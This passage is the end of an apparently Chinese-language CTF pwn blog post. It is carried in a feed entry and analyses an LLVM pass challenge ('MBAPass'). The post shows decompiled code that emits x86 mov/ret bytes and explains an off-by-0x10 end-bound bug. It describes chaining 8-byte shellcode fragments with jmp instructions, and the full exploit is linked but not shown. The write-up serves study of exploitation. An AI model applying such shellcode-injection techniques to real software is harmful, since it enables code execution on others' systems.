*)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">    SExtValue = llvm::ConstantInt::<span class="built_in">getSExtValue</span>(v2);</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, SExtValue);</span><br><span class="line">        <span class="keyword">return</span> `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;((__int64)&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">return</span> `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">        *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,<span class="keyword">void</span>&gt;(v26);</span><br><span class="line">    std::stack&lt;<span class="keyword">int</span>&gt;::stack&lt;std::deque&lt;<span class="keyword">int</span>&gt;,<span class="keyword">void</span>&gt;(v25);</span><br><span class="line">    std::stack&lt;llvm::Value *&gt;::<span class="built_in">push</span>(v26, &amp;Operand);</span><br><span class="line">    v24 = <span class="number">1</span>;</span><br><span class="line">    std::stack&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push</span>(v25, &amp;v24);</span><br><span class="line">    <span class="keyword">while</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) &lt; v30 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !std::stack&lt;llvm::Value *&gt;::<span class="built_in">size</span>(v26) )</span><br><span class="line">        &#123;</span><br><span class="line">            `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>并且这里根据handle的处理可以看出来是将v30当作结束地址，再看一下比较重要的几个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_anonymous_namespace_::MBAPass *__fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(</span><br><span class="line">        _anonymous_namespace_::MBAPass *<span class="keyword">this</span>,</span><br><span class="line">        <span class="keyword">int</span> a2,</span><br><span class="line">        __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _anonymous_namespace_::MBAPass *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  **((_BYTE **)<span class="keyword">this</span> + <span class="number">5</span>) = <span class="number">0x48</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    *(_BYTE *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">1LL</span>) = <span class="number">0xBB</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_BYTE *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">1LL</span>) = <span class="number">0xB8</span>;</span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(_QWORD *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">2LL</span>) = a3;</span><br><span class="line">  *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) += <span class="number">10LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里其实就是写shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>test=<span class="string">b&#x27;\x48\xbb\xfe\xdc\xba\x98\x76\x54\x32\x10&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(test)</span><br><span class="line"><span class="string">&#x27;   0:   48 bb fe dc ba 98 76 54 32 10   movabs rbx, 0x1032547698badcfe&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>但是这里的漏洞点是在handle函数中将this[4]+0xff0当作了结束的位置，所以还存在0x10是我们可写的，所以我们通过借位的思想来书写shellcode</p><p>在正常情况下执行：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727172355078.png"                      alt="image-20220727172355078"                ></p><p>我们是可以顺利执行结束的</p><p>那如果第二次我们的指令刚好到达0xff0执行完毕就会出现以下情况：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727172455946.png"                      alt="image-20220727172455946"                ></p><p> 这里就会接着跳转回去，随后我们每次可控的内容只有八个字节，所以后续就是分片的思想通过jmp指令连接起我们的shellcode</p><p>讲两句：这司马难度的shellcode确定是想我们比赛的时候来做吗？</p><p>exp略长，需要的 <a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a> 自取</p><hr><p>参考链接：<a class="link"   href="https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3" >https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简要介绍&quot;&gt;&lt;a href=&quot;#简要介绍&quot; class=&quot;headerlink&quot; title=&quot;简要介绍&quot;&gt;&lt;/a&gt;简要介绍&lt;/h2&gt;&lt;p&gt;首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：&lt;/p&gt;
&lt;p&gt;LLVM是构架编译器的框架系统，以C++编写</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="llvm pass" scheme="https://cv196082.gitee.io/tags/llvm-pass/"/>
    
  </entry>
  
</feed>
